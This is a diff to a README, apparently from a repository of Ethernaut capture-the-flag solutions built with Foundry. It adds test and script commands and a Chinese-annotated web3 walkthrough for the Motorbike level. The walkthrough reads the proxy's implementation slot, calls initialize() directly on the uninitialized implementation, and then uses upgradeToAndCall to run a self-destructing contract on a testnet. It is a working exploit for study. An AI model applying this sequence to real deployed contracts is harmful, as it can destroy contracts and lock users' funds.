@@ -23,9 +23,36 @@ forge test --match-path ./test/Shop.t.sol
 forge test --match-path ./test/Dex.t.sol
 forge test --match-path ./test/DexTwo.t.sol
 forge test --match-path ./test/PuzzleWallet.t.sol
+forge test --match-path ./test/Motorbike.t.sol
+
+forge script script/MotorbikeDeploy.s.sol --rpc-url $RPC_URL_LOCAL --broadcast
+forge script script/MotorbikeInteract.s.sol --rpc-url $RPC_URL_LOCAL --broadcast
 
 forge install OpenZeppelin/openzeppelin-contracts@v3.4.2 --no-commit (solidity 0.6)
 forge install OpenZeppelin/openzeppelin-contracts@v4.8.2 --no-commit (solidity 0.6)
+```
+
+Motorbike web 实现(sepolia 网络)
+
+```
+获取当前逻辑合约的地址
+await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
+
+0x000000000000000000000000e414f6cb24cf364877fa306b3e488f3204650721
+返回的值将为 32 个字节，其中最右边的 20 个字节将是地址。梳理一下，并在其左侧附加 0x。
+我们得到 0xe414f6cb24cf364877fa306b3e488f3204650721
+
+let initializeCall = web3.eth.abi.encodeFunctionSignature("initialize()")
+let implAddr = "0xe414f6cb24cf364877fa306b3e488f3204650721"
+await web3.eth.sendTransaction({from: player, to: implAddr, data: initializeCall})
+
+remix 部署 Destructive
+0x788d8efa489aD7f32cA96e2B8e4d4d2aBac0B168
+
+let kill = web3.eth.abi.encodeFunctionSignature("killed()")
+let callStr = web3.eth.abi.encodeFunctionCall({ name: 'upgradeToAndCall', type: 'function', inputs: [{ type: 'address', name: 'newImplementation' },{ type: 'bytes', name: 'data' }]}, ["0x788d8efa489aD7f32cA96e2B8e4d4d2aBac0B168",kill]);
+
+await web3.eth.sendTransaction({from: player, to: implAddr, data: callStr})
 ```
 
 ## Foundry
